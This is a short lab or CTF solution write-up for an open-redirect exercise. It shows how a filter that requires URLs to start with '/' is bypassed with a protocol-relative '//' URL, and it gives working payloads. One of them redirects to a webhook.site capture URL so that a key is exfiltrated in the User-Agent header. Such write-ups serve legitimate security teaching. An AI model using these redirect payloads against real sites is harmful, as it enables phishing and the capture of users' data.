## Solution
1. Visiting the Web-page and using the same technique that we useb in `Open Redirect 1` exercise doesn't work
2. So playing around with the website I noticed one thing. One of the common filtering people put in place is making sure that the url starts with `/`
3. However, what we can do to bypass it is use `//` and add the url.
4. Using the below format of Open redirect, we can visit the google home page.
```
redirect.php?uri=//www.google.com
```
5. So, now we can replace google's url and replace it with webhook's url.
```
https://demo.libcurl.so/redirect.php?uri=//webhook.site/d052a2fa-9f8f-4775-a4ea-981f32415e97
```
6. Once, we send the request, we get the key in `User-Agent` header
